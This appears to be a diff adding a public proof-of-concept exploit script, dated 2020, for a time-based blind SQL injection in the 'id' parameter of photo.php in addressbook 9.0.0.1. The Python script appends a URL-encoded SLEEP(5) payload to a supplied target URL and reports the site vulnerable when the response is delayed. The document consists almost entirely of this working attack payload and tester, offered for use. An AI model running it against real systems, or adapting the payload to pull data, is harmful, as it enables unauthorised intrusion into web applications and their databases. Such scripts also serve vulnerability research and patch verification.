@@ -1,0 +1,31 @@
+# Title: addressbook 9.0.0.1 - 'id' SQL Injection 
+# Date: 2020-04-01
+# Author: David Velazquez a.k.a. d4sh&r000
+# vulnerable application:  https://sourceforge.net/projects/php-addressbook/files/latest/download
+# vulnerable version: 9.0.0.1
+# Discription: addressbook 9.0.0.1 time-based blind SQL injection 
+# Tested On: Ubuntu Server 20.04 LTS
+# Platform: PHP
+# Type: webapp
+
+# Use:
+# addressbook9-SQLi.py #http://127.0.0.1/photo.php?id=1'
+
+
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import sys
+import requests
+
+def isVulnerable(URL):
+    """Check if the URL is vulnerable to ime-based blind SQL injection"""
+    response = requests.get(URL+'%27%20AND%20(SELECT%207812%20FROM%20(SELECT(SLEEP(5)))MkTv)%20AND%20%27nRZy%27=%27nRZy')
+    s=response.elapsed.total_seconds()
+    if s>5:#I put a sleep sentence to test the bug
+      sys.stdout.write('[+] Aplication is vulnerable!!!\n')
+    else:
+      sys.stdout.write('[+] Aplication NOT vulnerable\n')    
+    
+if __name__ == "__main__":
+    isVulnerable(sys.argv[1])
